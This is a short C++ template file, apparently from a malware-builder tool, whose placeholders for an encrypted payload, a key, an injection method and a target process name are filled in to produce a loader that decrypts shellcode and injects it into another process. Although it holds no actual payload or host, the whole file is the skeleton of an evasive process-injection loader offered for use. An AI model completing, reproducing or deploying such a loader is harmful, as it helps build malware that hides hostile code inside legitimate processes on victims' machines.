#include "Injector.h"
#include "InjectionMethods/DESIRED_INJECTOR.h"
#include "Decryptors/DESIRED_ENCRYPTORDecryptor.h"
using namespace std;

int main(){
    INSERTPAYLOADHERE
    INSERTKEYHERE
    unsigned int payload_len = sizeof(payload);
    unsigned int key_len = sizeof(key);

    char procName[] = "INSERTDESIREDNAME";

    Decryptor *decryptor = new DESIRED_ENCRYPTORDecryptor();
    Injector *injector = new DESIRED_INJECTOR(key, payload, payload_len, key_len, decryptor, procName);
    injector->Inject();
}